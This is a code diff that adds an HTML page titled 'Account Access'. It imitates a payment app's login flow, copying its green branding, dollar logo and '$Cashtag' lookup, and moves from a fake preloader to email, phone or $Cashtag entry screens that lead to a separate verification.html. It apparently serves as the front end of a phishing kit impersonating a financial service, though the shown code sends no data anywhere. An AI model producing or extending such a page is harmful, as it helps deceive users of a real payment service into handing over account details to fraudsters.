@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Account Access</title>
+<style>
+    /* Compact CSS Variables & Base */
+    :root { --bg: #fff; --green: #00D632; --btn-light: #EBEBEB; --btn-dark: #000; --disabled: #AEAEAE; --border: #b3b3b3; }
+    body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: var(--bg); overflow: hidden; }
+    * { box-sizing: border-box; }
+    
+    /* View Controller */
+    .view { display: none; flex-direction: column; justify-content: space-between; max-width: 400px; height: 100vh; margin: 0 auto; padding: 24px 20px 40px; position: relative; }
+    .active { display: flex; }
+    
+    /* Preloader */
+    #view-preload { background: var(--green); justify-content: center; align-items: center; padding: 0; }
+    .logo-box { background: #000; width: 110px; height: 110px; border-radius: 28px; display: flex; justify-content: center; align-items: center; }
+    .logo-box svg { fill: var(--green); width: 54px; height: 54px; }
+    .wait-text { position: absolute; bottom: 50px; font-size: 16px; }
+    
+    /* Shared Elements */
+    h1 { margin: 0 0 24px; font-size: 32px; font-weight: 700; letter-spacing: -0.8px; line-height: 1.1; }
+    .top-row { display: flex; justify-content: space-between; margin-bottom: 24px; }
+    .btn-circle { width: 44px; height: 44px; border-radius: 50%; border: none; display: flex; justify-content: center; align-items: center; cursor: pointer; }
+    .btn-close { background: #F7F7F7; margin-left: -4px; }
+    .btn-help { background: #fff; box-shadow: 0 4px 16px rgba(0,0,0,0.06); font-size: 20px; margin-left: auto; }
+    
+    .shield { background: var(--green); width: 64px; height: 64px; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-bottom: 16px; }
+    .shield svg { fill: #fff; width: 32px; height: 32px; }
+    
+    /* Inputs & Buttons */
+    .input-box { width: 100%; border: 1px solid var(--border); border-radius: 8px; padding: 18px 16px; font-size: 16px; outline: none; transition: 0.2s; }
+    .input-box:focus { border-color: #000; border-width: 2px; padding: 17px 15px; }
+    
+    .btn { border: none; border-radius: 30px; padding: 18px; font-size: 16px; font-weight: 600; cursor: pointer; text-align: center; width: 100%; transition: 0.2s;}
+    .btn-light { background: var(--btn-light); color: #000; margin-bottom: 12px; }
+    .btn-dark { background: var(--btn-dark); color: #fff; }
+    .btn-disabled { background: var(--disabled); color: #fff; pointer-events: none; }
+    
+    .link-wrap { text-align: center; margin-top: 24px; }
+    .link { color: #000; font-size: 15px; font-weight: 600; text-decoration: underline; cursor: pointer; }
+    
+    /* Typing Reveal Footer */
+    #disclaimer { text-align: center; font-size: 13px; line-height: 1.5; margin: 0 0 20px; opacity: 0; visibility: hidden; transition: 0.3s; }
+    #disclaimer a { color: #000; font-weight: 600; text-decoration: underline; }
+    .bot-row { display: flex; gap: 12px; width: 100%; }
+</style>
+</head>
+<body>
+
+<!-- 1. PRELOADER SCREEN -->
+<div id="view-preload" class="view active">
+    <div class="logo-box">
+        <svg viewBox="0 0 24 24"><path d="M11.8 1.5C12.4 1.5 13 2.0 13 2.7V4.1C15.8 4.5 18 6.5 18 9C18 9.6 17.4 10.2 16.8 10.2C16.1 10.2 15.6 9.6 15.6 9C15.6 7.6 14.1 6.4 11.8 6.4C9.4 6.4 8 7.6 8 9C8 10.3 9.4 11.6 11.8 11.6C15.2 11.6 18 13.5 18 16C18 18.4 15.8 20.4 13 20.8V22.3C13 22.9 12.4 23.5 11.8 23.5C11.1 23.5 10.6 22.9 10.6 22.3V20.8C7.7 20.4 5.6 18.4 5.6 16C5.6 15.3 6.1 14.8 6.8 14.8C7.4 14.8 8 15.3 8 16C8 17.3 9.4 18.6 11.8 18.6C14.1 18.6 15.6 17.3 15.6 16C15.6 14.6 14.1 13.4 11.8 13.4C8.3 13.4 5.6 11.4 5.6 9C5.6 6.5 7.7 4.5 10.6 4.1V2.7C10.6 2.0 11.1 1.5 11.8 1.5Z"/></svg>
+    </div>
+    <div class="wait-text">Please wait...</div>
+</div>
+
+<!-- 2. FIND ACCOUNT SCREEN -->
+<div id="view-find" class="view">
+    <div>
+        <div class="top-row"><button class="btn-circle btn-close" onclick="location.reload()"><svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M6 6L18 18M6 18L18 6" stroke="black" stroke-width="2" stroke-linecap="round"/></svg></button></div>
+        <div class="shield"><svg viewBox="0 0 24 24"><path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1ZM10 17L5 12L6.41 10.59L10 14.17L17.59 6.58L19 8L10 17Z"/></svg></div>
+        <h1 style="font-size:30px">Find your account</h1>
+    </div>
+    <div>
+        <!-- Inline scripts directly attached to buttons -->
+        <button class="btn btn-light" onclick="openInput('phone')">Phone number</button>
+        <button class="btn btn-light" onclick="openInput('email')">Email</button>
+        <button class="btn btn-light" onclick="showView('view-cashtag')">$Cashtag</button>
+        <div class="link-wrap"><a class="link">I don't have any of these</a></div>
+    </div>
+</div>
+
+<!-- 3. EMAIL OR PHONE SCREEN -->
+<div id="view-input" class="view">
+    <div>
+        <div class="top-row"><button class="btn-circle btn-help">?</button></div>
+        <h1 id="in-title">Enter your email</h1>
+        <!-- oninput triggers the footer reveal -->
+        <input type="text" id="main-input" class="input-box" placeholder="Email address" oninput="checkTyping(this.value)">
+        <div class="link-wrap"><a class="link">Need help logging in?</a></div>
+    </div>
+    <div>
+        <p id="disclaimer">By entering and tapping Next, you agree to<br>the <a>Terms</a>, <a>E-Sign Consent</a> & <a>Privacy Notice</a></p>
+        <div class="bot-row">
+            <button class="btn btn-light" id="btn-switch" onclick="toggleInput()">Use Phone</button>
+            <button class="btn btn-disabled" id="btn-next" onclick="location.href='verification.html'">Next</button>
+        </div>
+    </div>
+</div>
+
+<!-- 4. CASHTAG SCREEN -->
+<div id="view-cashtag" class="view">
+    <div>
+        <div class="top-row"><button class="btn-circle btn-close" onclick="showView('view-find')"><svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M6 6L18 18M6 18L18 6" stroke="black" stroke-width="2" stroke-linecap="round"/></svg></button></div>
+        <h1>Enter the $Cashtag for<br>your account</h1>
+        <input type="text" class="input-box" placeholder="$cashtag">
+    </div>
+    <button class="btn btn-dark" onclick="location.href='verification.html'">Continue</button>
+</div>
+
+<!-- 5. COMPACT JAVASCRIPT -->
+<script>
+    // Automatically transition from Green Preloader to Menu after 1.8s
+    setTimeout(() => showView('view-find'), 1800);
+
+    // General view switcher
+    function showView(id) {
+        document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+    }
+
+    // Handles setting up the Email or Phone input view
+    let currentType = 'email';
+    function openInput(type) {
+        currentType = type;
+        document.getElementById('main-input').value = '';
+        checkTyping(''); // Reset typing footer
+        updateUI();
+        showView('view-input');
+    }
+
+    // Toggles between Phone / Email
+    function toggleInput() {
+        currentType = currentType === 'email' ? 'phone' : 'email';
+        document.getElementById('main-input').value = '';
+        checkTyping(''); 
+        updateUI();
+    }
+
+    // Updates text based on Email/Phone selection
+    function updateUI() {
+        const title = document.getElementById('in-title');
+        const input = document.getElementById('main-input');
+        const btn = document.getElementById('btn-switch');
+        
+        if (currentType === 'email') {
+            title.innerText = 'Enter your email';
+            input.type = 'email';
+            input.placeholder = 'Email address';
+            btn.innerText = 'Use Phone';
+        } else {
+            title.innerText = 'Enter your phone or email';
+            input.type = 'tel';
+            input.placeholder = '+1 Phone Number';
+            btn.innerText = 'Use Email';
+        }
+    }
+
+    // Runs instantly as user types (reveals footer & turns on 'Next' button)
+    function checkTyping(val) {
+        const disc = document.getElementById('disclaimer');
+        const nextBtn = document.getElementById('btn-next');
+        
+        if (val.trim().length > 0) {
+            disc.style.visibility = 'visible'; 
+            disc.style.opacity = '1';
+            nextBtn.className = 'btn btn-dark'; // Enable visually
+        } else {
+            disc.style.visibility = 'hidden'; 
+            disc.style.opacity = '0';
+            nextBtn.className = 'btn btn-disabled'; // Disable visually
+        }
+    }
+</script>
+</body>
+</html>
